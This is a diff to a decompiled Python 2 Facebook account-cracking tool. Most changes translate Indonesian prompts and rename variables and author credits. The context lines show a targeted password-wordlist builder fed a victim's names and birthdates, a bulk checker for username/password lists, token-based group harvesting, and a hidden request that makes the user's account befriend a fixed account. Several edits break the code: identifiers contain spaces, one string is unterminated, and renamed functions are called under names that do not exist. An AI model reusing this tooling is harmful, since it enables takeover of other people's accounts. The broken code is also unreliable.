@@ -1,4 +1,4 @@
-#Decompiled by MR.K7C8NG
+#Decompiled by Spook Flare
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
 
@@ -11,19 +11,19 @@ br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
-def keluar():
+def Out():
     print '\x1b[1;91m[!] Keluar'
     os.sys.exit()
 
 
-def jalan(z):
+def Running(z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
         time.sleep(0.01)
 
 
-logo = '\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;93mv1.6\n\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mMR.K7C8NG\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96mInDoNeSiA CYBER ErRoR SyStEm\x1b[1;97m[\x1b[1;96m\x1b[1;97m] \x1b[1;97m/ \x1b[1;96mGUNAKAN DENGAN BIJAK \x1b[1;97m/ \x1b[1;96mMR.K7C8NG\n\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/pashayogi\x1b[0m\n[*] Decompiled by MR.K7C8NG\n'
+logo = '\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;93mv1.6\n\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mMR.K7C8NG\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96mInDoNeSiA CYBER ErRoR SyStEm\x1b[1;97m[\x1b[1;96m\x1b[1;97m] \x1b[1;97m/ \x1b[1;96m Don't Use this for Crime action  \x1b[1;97m/ \x1b[1;96mMR.Ice Ty\n\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/Ice Ty\x1b[0m\n[*] Decompiled by Yash Angga\n'
 
 def tik():
     titik = [
@@ -38,19 +38,19 @@ back = 0
 threads = []
 berhasil = []
 cekpoint = []
-gagal = []
-idteman = []
-idfromteman = []
+Failed = []
+Friend Id = []
+Id From Friend = []
 idmem = []
 id = []
 em = []
-emfromteman = []
+em from friend = []
 hp = []
-hpfromteman = []
-reaksi = []
-reaksigrup = []
-komen = []
-komengrup = []
+hp from friend = []
+Reaction = []
+Group Reaction = []
+Comment = []
+Group Comment = []
 listgrup = []
 vulnot = '\x1b[31mNot Vuln'
 vuln = '\x1b[32mVuln'
@@ -97,11 +97,11 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://youtube.com/NjankSoekamti')
+                os.system('xdg-open https://youtube.com/NeuroTrikz')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
-                print '\n\x1b[1;91m[!] Tidak ada koneksi'
+                print '\n\x1b[1;91m[!] Connection Error'
                 keluar()
 
         if 'checkpoint' in url:
@@ -1902,23 +1902,23 @@ def wordlist():
             os.system('clear')
             print logo
             print 40 * '\x1b[1;97m\xe2\x95\x90'
-            print '\x1b[1;91m[?] \x1b[1;92mIsi data lengkap target dibawah'
+            print 40 * '\x1b[1;97m\xe2\x95\x90' fill with this form with ur mind 
             print 40 * '\x1b[1;97m\xe2\x95\x90'
-            a = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Depan \x1b[1;97m: ')
+            a = raw_input('\x1b[1;91m[+] \x1b[1;92m First Name \x1b[1;97m: ')
             file = open(a + '.txt', 'w')
-            b = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Tengah \x1b[1;97m: ')
-            c = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Belakang \x1b[1;97m: ')
-            d = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Panggilan \x1b[1;97m: ')
-            e = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
+            b = raw_input('\x1b[1;91m[+] \x1b[1;92m Middle Name \x1b[1;97m: ')
+            c = raw_input('\x1b[1;91m[+] \x1b[1;92m Back Namw \x1b[1;97m: ')
+            d = raw_input('\x1b[1;91m[+] \x1b[1;92m Calling Name \x1b[1;97m: ')
+            e = raw_input('\x1b[1;91m[+] \x1b[1;92m Date Born >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
             f = e[0:2]
             g = e[2:4]
             h = e[4:]
             print 40 * '\x1b[1;97m\xe2\x95\x90'
-            print '\x1b[1;91m[?] \x1b[1;93mKalo Jomblo SKIP aja :v'
-            i = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Pacar \x1b[1;97m: ')
-            j = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Panggilan Pacar \x1b[1;97m: ')
-            k = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir Pacar >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+            print '\x1b[1;91m[?] \x1b[1;93m Create another word list name. ( Guess with ur mind ) :x)
+            i = raw_input('\x1b[1;91m[+] \x1b[1;92m your family \x1b[1;97m: ')
+            j = raw_input('\x1b[1;91m[+] \x1b[1;92m What's ur Favorite song \x1b[1;97m: ')
+            k = raw_input('\x1b[1;91m[+] \x1b[1;92m Date were your family born >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92m please wait \x1b[1;97m...')
             l = k[0:2]
             m = k[2:4]
             n = k[4:]
@@ -1945,11 +1945,11 @@ def wordlist():
 
             file.close()
             time.sleep(1.5)
-            print '\n\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m: \x1b[1;97m %s.txt' % a
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            print '\n\x1b[1;91m[+] \x1b[1;97m Saved \x1b[1;91m: \x1b[1;97m %s.txt' % a
+            raw_input('\n\x1b[1;91m[ \x1b[1;97m Return \x1b[1;91m]')
             lain()
         except IOError as e:
-            print '\x1b[1;91m[!] Gagal membuat file'
+            print '\x1b[1;91m[!] Failed in created file'
             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
             lain()
 
@@ -1959,7 +1959,7 @@ def check_akun():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;91m[!] Token tidak ditemukan'
+        print '\x1b[1;91m[!] Token not found'
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
@@ -1976,12 +1976,12 @@ def check_akun():
             file = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m:\x1b[1;97m ')
             list = open(file, 'r').readlines()
         except IOError:
-            print '\x1b[1;91m[!] File tidak ditemukan'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            print '\x1b[1;91m[!] File not found'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97m Return \x1b[1;91m]')
             lain()
 
-    pemisah = raw_input('\x1b[1;91m[+] \x1b[1;92mPemisah \x1b[1;91m:\x1b[1;97m ')
-    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+    pemisah = raw_input('\x1b[1;91m[+] \x1b[1;92m Division \x1b[1;91m:\x1b[1;97m ')
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92m Please wait \x1b[1;97m...')
     print 40 * '\x1b[1;97m\xe2\x95\x90'
     for meki in list:
         username, password = meki.strip().split(str(pemisah))
@@ -1999,16 +1999,16 @@ def check_akun():
             print '\x1b[1;97m[\x1b[1;91mMati\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password
 
     print '\n\x1b[1;91m[+] \x1b[1;97mTotal\x1b[1;91m : \x1b[1;97mLive=\x1b[1;92m' + str(len(live)) + ' \x1b[1;97mCheck=\x1b[1;93m' + str(len(cek)) + ' \x1b[1;97mDie=\x1b[1;91m' + str(len(die))
-    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
-    lain()
+    raw_input('\n\x1b[1;91m[ \x1b[1;97m Return \x1b[1;91m]')
+    Another()
 
 
-def grupsaya():
+def My Group():
     os.system('clear')
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;91m[!] Token tidak ditemukan'
+        print '\x1b[1;91m[!] Token not found'
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
@@ -2016,18 +2016,18 @@ def grupsaya():
         os.system('clear')
         print logo
         print 40 * '\x1b[1;97m\xe2\x95\x90'
-        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+        Run('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
         print 40 * '\x1b[1;97m\xe2\x95\x90'
         try:
             uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
             gud = json.loads(uh.text)
             for p in gud['data']:
-                nama = p['name']
-                id = p['id']
+                Nams = p['name']
+                Id = p['id']
                 f = open('grupid.txt', 'w')
                 listgrup.append(id)
                 f.write(id + '\n')
-                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + str(nama)
+                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + str(name)
                 print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + str(id)
                 print 40 * '\x1b[1;97m='
 
@@ -2035,23 +2035,23 @@ def grupsaya():
             print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m: \x1b[1;97mgrupid.txt'
             f.close()
             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
-            lain()
+            Another()
         except (KeyboardInterrupt, EOFError):
-            print '\x1b[1;91m[!] Terhenti'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
-            lain()
+            print '\x1b[1;91m[!] Stopped'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97m Return \x1b[1;91m]')
+            Another()
         except KeyError:
             os.remove('grupid.txt')
-            print '\x1b[1;91m[!] Grup tidak ditemukan'
+            print '\x1b[1;91m[!] Grup not found'
             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
             lain()
         except requests.exceptions.ConnectionError:
             print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
             keluar()
         except IOError:
-            print '\x1b[1;91m[!] Kesalahan saat membuat file'
+            print '\x1b[1;91m[!] Problem in creating file'
             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
-            lain()
+            Another()
 
 
 def guard():
@@ -2060,7 +2060,7 @@ def guard():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;91m[!] Token tidak ditemukan'
+        print '\x1b[1;91m[!] Token not found'
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
